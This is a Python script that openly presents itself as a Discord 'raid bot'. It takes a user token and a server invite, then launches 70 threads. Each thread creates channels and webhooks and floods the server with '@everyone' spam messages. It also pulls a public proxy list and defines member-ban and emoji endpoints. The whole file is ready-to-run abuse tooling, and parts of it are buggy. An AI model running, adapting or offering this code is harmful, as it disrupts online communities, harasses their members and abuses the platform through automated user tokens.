"""
this raid bot was proudly coded by BKS (https://github.com/heygdrg).
Copyright (c) 2021 BKS#1958 | 
This tool under the GNU General Public Liscense v2 (1991)."""


try:
    import requests
    import threading
    import sys
    import os 
except:
    import os 
    os.system('pip install requests')
    os.system('pip install threading')
    os.system('pip install sys')

def getheaders(token):
    headers =     {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    }
    if token:
        headers.update({"Authorization": util["token"]})
        return headers

token = input('token : ')


util = {
        "token" : token
}

url =  {"guild_verification" : "https://discord.com/api/v9/invites/{invite_link}",
        "token_verification" : "https://discord.com/api/v6/users/@me"
}


res = requests.get(url["token_verification"],
            headers=getheaders(token))

if res.status_code == 200:
    
    res = requests.get(url["token_verification"],
                headers=getheaders(token)).json()
    username = res['username'] 

else:

    print('invalid token ')
    sys.exit()

invite_link = input('invitation link : ')

try:
    
    invite_link = invite_link.split("/")[3]
    r = requests.get(url["guild_verification"].format(invite_link = invite_link),
            headers = getheaders(token))
    
    if r.status_code == 200:
        pass
        guild_id = r.json()["guild"]["id"]
        guild_name = r.json()["guild"]["name"]
        os.system(f'Title - RAIDER BOT - V1 - connect as : {username} on : {guild_name}')
    
    else:
        print('please enter a valid token')
        print(f'error : {r.json()}')

except:
    
    print('invitaion not available')
    sys.exit()

util = {"guild_id" : guild_id,
        "webhook_name" : "Raid by bks",
        "message_content" : "@everyone ez raid bro ",
        "channel_name" : "raid by bks",
        "token" : token
}

url =  {"guild_verification" : "https://discord.com/api/v9/invites/{invite_link}",
        "token_verification" : "https://discord.com/api/v6/users/@me",
        "channel" : "https://discord.com/api/v9/guilds/{guild_id}/channels",
        "webhook" : "https://discord.com/api/v9/channels/{channel_id}/webhooks",
        "message" : "https://discord.com/api/webhooks/{webhook_id}/{webhook_token}",
        "proxy" : "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "kick_member" : "https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}",
        "add_emoji" : "https://discord.com/api/v9/guilds/{guild_id}/emojis"
}

def proxy_scrape(url):
    turn = 0
    url = url['proxy']
    pro = requests.get(url).text
    proxy_list = [pro]
    proxy = proxy_list.split("\n")
    print(proxy)

def raid(util, url):

    def spam():
        
        for i in range(1):
            
            channel = requests.post(url["channel"].format(guild_id = util['guild_id']),
                        json={"name": util[f"channel_name"],'content': 'raid'},
                        headers =getheaders(util[f"token"]),
                    ).json()
            #channel_create = channel_create + 1
            #os.system(f'Title - RAIDER BOT - Channel create : {channel_create} webhook_create : {webhook_create} message sent : {message_sent}')
            print(channel)
            channel_id = channel['id']
            
            for i in range(10):
                
                webhook = requests.post(url["webhook"].format(channel_id = channel_id),
                            json={"name": util["webhook_name"],'content': 'raid'},
                            headers =getheaders(util["token"])
                        )
                if webhook.status_code == 200:
                    #webhook_create = webhook_create + 1
                    #os.system(f'Title - RAIDER BOT - Channel create : {channel_create} webhook_create : {webhook_create} message sent : {message_sent}')
                    pass
                
                else:
                    print('error rate limit')
                
                webhook = webhook.json()    
                
                if 'rate limit' in webhook.get('message', ''):
                    print('error rate limit')
                    sys.exit()
                
                else: 
                    print(webhook)
                    webhook_token = webhook['token']
                    webhook_id = webhook['id']

                    for i in range(30):  
                        
                        message = requests.post(url['message'].format(webhook_id = webhook_id, webhook_token = webhook_token),
                                    json={"name": util["channel_name"],'content': util["message_content"]},
                                    headers =getheaders(util["token"])
                                )
                        if message.status_code == 204:
                            #message_sent = message_sent + 1 
                            #os.system(f'Title - RAIDER BOT - Channel create : {channel_create} webhook_create : {webhook_create} message sent : {message_sent}')
                            print(message.json())
                            pass
                        
                        else:
                            print("An error occured while sending message")
                            print(f"error : {message.json()}")
                            input("Enter anything to close")
                            sys.exit()
    
    threads = []
    for i in range(70):
        t = threading.Thread(target=spam)
        threads.append(t)
        t.start()

raid(util,url)
